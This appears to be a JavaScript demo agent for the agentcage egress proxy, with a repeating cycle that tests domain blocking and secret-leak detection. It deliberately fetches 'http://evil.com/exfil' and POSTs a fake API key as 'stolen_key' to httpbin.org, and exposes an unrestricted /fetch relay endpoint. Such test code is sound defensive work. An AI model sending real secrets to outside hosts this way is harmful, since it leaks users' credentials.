// Minimal agent that demonstrates agentcage proxy behavior.
// Exposes an HTTP server on port 3000 with endpoints to exercise
// domain filtering and secret leak detection interactively.
// No real API key needed — uses httpbin.org as the upstream.
//
// AGENT_DEMO=false disables the startup demo cycle (used by E2E tests
// to avoid resolving httpbin.org before /etc/hosts on the proxy is
// patched to the local mock IP — that race poisons mitmproxy's
// connection pool with the real upstream IP).

const http = require("http");

const PORT = 3000;
const FAKE_SECRET = "sk-ant-FAKE01-abcdefghijklmnopqrstuvwxyz";

// --- Demo cycle (runs on startup + every 60s for log output) ---

async function demoCycle() {
  console.log("--- demo cycle ---");
  console.log(`HTTP_PROXY=${process.env.HTTP_PROXY}`);
  console.log(`HTTPS_PROXY=${process.env.HTTPS_PROXY}`);
  console.log();

  // 1. Allowed request
  console.log("[1] GET httpbin.org/get (allowed domain)...");
  try {
    const res = await fetch("http://httpbin.org/get");
    console.log(`  HTTP ${res.status}`);
  } catch (err) {
    console.log(`  ERROR: ${err.message}`);
  }

  // 2. Blocked request
  console.log("[2] GET evil.com (blocked domain)...");
  try {
    const res = await fetch("http://evil.com/exfil");
    console.log(`  HTTP ${res.status}`);
  } catch (err) {
    console.log(`  BLOCKED: ${err.message}`);
  }

  // 3. Secret leak detection
  console.log("[3] POST secret to httpbin.org (leak detection)...");
  try {
    const res = await fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ stolen_key: FAKE_SECRET }),
    });
    console.log(`  HTTP ${res.status}`);
  } catch (err) {
    console.log(`  BLOCKED: ${err.message}`);
  }

  // 4. Clean POST
  console.log("[4] POST clean data to httpbin.org (allowed)...");
  try {
    const res = await fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: "hello from the cage", count: 42 }),
    });
    console.log(`  HTTP ${res.status}`);
  } catch (err) {
    console.log(`  ERROR: ${err.message}`);
  }

  console.log("--- demo cycle complete ---\n");
}

// --- HTTP server ---

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => resolve(Buffer.concat(chunks).toString()));
    req.on("error", reject);
  });
}

function json(res, status, obj) {
  const body = JSON.stringify(obj, null, 2);
  res.writeHead(status, {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(body),
  });
  res.end(body);
}

async function handleRoot(_req, res) {
  json(res, 200, {
    service: "agentcage basic example",
    http_proxy: process.env.HTTP_PROXY || null,
    https_proxy: process.env.HTTPS_PROXY || null,
    endpoints: [
      "GET  /                  — this health check",
      "GET  /fetch?url=<url>   — proxy a fetch to <url>",
      "POST /check-secret      — forward body to httpbin.org/post",
    ],
  });
}

async function handleFetch(req, res) {
  const u = new URL(req.url, `http://${req.headers.host}`);
  const target = u.searchParams.get("url");
  if (!target) {
    return json(res, 400, { error: "missing ?url= parameter" });
  }

  try {
    const upstream = await fetch(target);
    const body = await upstream.text();
    json(res, upstream.status, {
      upstream_status: upstream.status,
      body_length: body.length,
      body_preview: body.slice(0, 512),
    });
  } catch (err) {
    json(res, 502, { error: err.message });
  }
}

async function handleCheckSecret(req, res) {
  const body = await readBody(req);

  try {
    const upstream = await fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    });
    const text = await upstream.text();
    json(res, upstream.status, {
      upstream_status: upstream.status,
      body_length: text.length,
      body_preview: text.slice(0, 512),
    });
  } catch (err) {
    json(res, 502, { error: err.message });
  }
}

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, `http://${req.headers.host}`);

  try {
    if (req.method === "GET" && u.pathname === "/") {
      await handleRoot(req, res);
    } else if (req.method === "GET" && u.pathname === "/fetch") {
      await handleFetch(req, res);
    } else if (req.method === "POST" && u.pathname === "/check-secret") {
      await handleCheckSecret(req, res);
    } else {
      json(res, 404, { error: "not found" });
    }
  } catch (err) {
    console.error(`Error handling ${req.method} ${req.url}:`, err);
    if (!res.headersSent) {
      json(res, 500, { error: "internal server error" });
    }
  }
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`agentcage basic example listening on 0.0.0.0:${PORT}`);
  // Run demo cycle on startup, then every 60s.
  // Set AGENT_DEMO=false to disable (used by E2E tests so the agent
  // never resolves the upstream domain before /etc/hosts is patched).
  if (process.env.AGENT_DEMO !== "false") {
    demoCycle();
    setInterval(demoCycle, 60_000);
  }
});
